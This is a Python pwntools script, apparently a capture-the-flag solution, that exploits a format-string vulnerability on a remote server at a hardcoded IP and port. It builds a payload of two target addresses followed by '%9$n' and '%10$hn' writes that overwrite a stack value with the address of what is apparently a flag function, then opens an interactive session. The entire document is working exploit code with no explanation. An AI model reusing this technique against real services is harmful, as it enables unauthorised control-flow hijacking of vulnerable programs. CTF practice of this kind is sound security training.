#!/usr/bin/env python
from pwn import *
import string
"""
stack_addr = 0xffffdd30 - 0x18
buf_addr = stack_addr - 0x34
"""

target = 0xffffdd30 - 4
noxFlag = 0x804867B

conn = remote("18.223.228.52", 13337)
conn.recvuntil("????")

low = (noxFlag)%0x10000
high = (noxFlag)/0x10000

payload = p32(target+2)
payload += p32(target)
payload += "%"+str(high-8)+"x"
payload += "%9$n"
payload += "%"+str(low-high)+"x"
payload += "%10$hn"

conn.sendline(payload)
conn.recvuntil("Hooo right...")
conn.interactive()


